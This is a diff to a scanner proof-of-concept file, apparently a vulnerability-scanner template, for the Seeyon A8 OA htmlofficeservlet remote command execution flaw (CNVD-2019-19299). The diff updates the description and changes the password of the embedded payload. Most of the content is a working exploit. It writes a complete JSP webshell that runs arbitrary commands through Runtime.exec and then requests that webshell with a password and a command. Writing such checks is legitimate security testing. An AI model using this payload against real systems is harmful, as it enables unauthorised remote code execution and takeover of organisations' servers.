@@ -4,7 +4,7 @@ name = "致远A8 OA htmlofficeservlet 远程命令执行 PoC"
 author = "AVE"
 severity = "critical"
 tags = ["rce", "cnvd", "zhiyuan", "seeyon"]
-description = "致远A8 OA系统htmlofficeservlet任意文件写入导致的远程命令执行漏洞。通过POST请求写入JSP webshell后验证命令执行。"
+description = "致远A8 OA系统/seeyon/htmlofficeservlet任意文件写入导致的远程命令执行漏洞。通过POST请求写入JSP webshell后访问webshell执行命令验证。"
 vuln_id = ["CNVD-2019-19299", "AVE-2026-0032"]
 
 [poc]
@@ -30,7 +30,7 @@ originalCreateDate=wUghPB3szB3Xwg66
 FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdb4o5nHzs
 needReadFile=yRWZdAS6
 originalCreateDate IZ=66==wLSGP4oEzLKAz4
-<%@page import="java.util.*,java.io.*"%><%!public static String excuteCmd(String c){StringBuilder line=new StringBuilder();try{Process pro=Runtime.getRuntime().exec(c);BufferedReader buf=new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp=null;while((temp=buf.readLine())!=null){line.append(temp+"\\n");}buf.close();}catch(Exception e){line.append(e.getMessage());}return line.toString();}%><%if("x".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd"))+"</pre>");}else{out.println(":-)");}%>6e4f045d4b8506bf492ada7e3390d7ce
+<%@page import="java.util.*,java.io.*"%><%!public static String excuteCmd(String c){StringBuilder line=new StringBuilder();try{Process pro=Runtime.getRuntime().exec(c);BufferedReader buf=new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp=null;while((temp=buf.readLine())!=null){line.append(temp+"\\n");}buf.close();}catch(Exception e){line.append(e.getMessage());}return line.toString();}%><%if("asasd33445".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd"))+"</pre>");}else{out.println(":-)");}%>6e4f045d4b8506bf492ada7e3390d7ce
 """
 
 [[poc.requests.matchers]]
@@ -47,7 +47,7 @@ expect = true
 [[poc.requests]]
 method = "GET"
 path = "/seeyon/test123456.jsp"
-query.pwd = "asasd3344"
+query.pwd = "asasd33445"
 query.cmd = "echo AVE_POC_TEST"
 
 [[poc.requests.matchers]]
